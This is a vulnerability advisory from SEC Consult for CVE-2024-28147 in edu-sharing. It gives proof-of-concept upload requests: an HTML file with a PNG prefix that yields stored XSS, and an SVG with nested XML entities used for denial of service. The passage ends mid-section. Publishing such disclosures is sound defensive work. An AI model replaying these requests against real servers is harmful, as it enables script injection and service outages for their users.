By

Kai Zimmermann (Office Frankfurt) | SEC Consult Vulnerability Lab

The open source software edu-sharing by metaVentis GmbH was vulnerable to an arbitrary file upload. This allowed an attacker for example to execute malicious JavaScript code in the victim's browser through Stored Cross Site Scripting (XSS) or to perform a Denial of Service attack.

## Vendor description

"*edu-sharing software enables you to network your learning platforms and other educational software. Share learning content, metadata and tools - make them available in an educational cloud and let your users use them in all connected systems.*"

Source: <https://edu-sharing.com>

## Business recommendation

The vendor provides a patch which should be installed immediately.

SEC Consult highly recommends to perform a thorough security review of the product conducted by security professionals to identify and resolve potential further security issues.

## Vulnerability overview/description

### 1) Arbitrary File Upload (CVE-2024-28147)

An authenticated user can upload arbitrary files in the upload function for collection preview images. An attacker may upload an HTML file that includes malicious JavaScript code which will be executed if a user visits the direct URL of the collection preview image (Stored Cross Site Scripting). It is also possible to upload SVG files that include nested XML entities. Those are parsed when a user visits the direct URL of the collection preview image, which may be utilized for a Denial of Service attack.

## Proof of concept

### 1) Arbitrary File Upload (CVE-2024-28147)

An authenticated user can update the preview image of an existing collection by sending the following request:

```
POST /edu-sharing/rest/collection/v1/collections/-home-/$COLLECTIONID/icon?mimetype=image%2Fpng HTTP/1.1
Host: $SERVER
Cookie: INGRESSCOOKIE=$INGRESSCOOKIE; JSESSIONID=$SESSIONID
Content-Type: multipart/form-data; boundary=---------------------------159605426213527963452762824885
Content-Length: 288

-----------------------------159605426213527963452762824885
Content-Disposition: form-data; name="file";

PNG

[...]
-----------------------------159605426213527963452762824885--
```

 The URL parameter "mimetype" can be modified to match any uploaded file. The value is directly used in the server's "Content-Type" header. Both, the Content-Type request header and the filename parameter in the Content-Disposition request header do not need to be included in the data boundary inside the request in order to be sent successfully and can therefore be removed.

 The preview image can then be accessed by visiting the following URL:

```
https:// $SERVER/edu-sharing/preview?nodeId=$COLLECTIONID
```
#### a) Stored Cross Site Scripting (HTML Upload)

The initial request can be modified to include an HTML file, while keeping the magic bytes of a PNG image file. The "mimetype" parameter is changed to "text/html":

```
POST /edu-sharing/rest/collection/v1/collections/-home-/$COLLECTIONID/icon?mimetype=text/html HTTP/1.1
Host: $SERVER
Cookie: INGRESSCOOKIE=$INGRESSCOOKIE; JSESSIONID=$SESSIONID
Content-Type: multipart/form-data; boundary=---------------------------159605426213527963452762824885
Content-Length: 288

-----------------------------159605426213527963452762824885
Content-Disposition: form-data; name="file";

PNG

<!DOCTYPE html>
<html>
<body>
<h1>Test</h1>
<script>alert(window.location)</script>
</body>
</html>
-----------------------------159605426213527963452762824885--
```

Visiting the preview URL as seen in figure 1 below shows that the JavaScript code is executed:

Figure 1: Stored XSS

#### b) Denial of Service (SVG Upload)

The initial request can be modified to upload an SVG file containing nested XML entities. The "mimetype" parameter is changed to "image%2Fsvg":

```
POST /edu-sharing/rest/collection/v1/collections/-home-/$COLLECTIONID/icon?mimetype=image%2Fsvg HTTP/1.1
Host: $SERVER
Cookie: INGRESSCOOKIE=$INGRESSCOOKIE; JSESSIONID=$SESSIONID
Content-Type: multipart/form-data; boundary=---------------------------29539943986372261721095197803
Content-Length: 581

-----------------------------29539943986372261721095197803
Content-Disposition: form-data; name="file";

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY bar "Text "><!ENTITY t1 "&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;&bar;"><!ENTITY t2 "&t1;&t1;&t1;&t1;">]>

	<data>&t2;</data>
</svg>

-----------------------------29539943986372261721095197803--
```

Visiting the preview URL as seen in figure 2 below shows that the XML code is parsed:
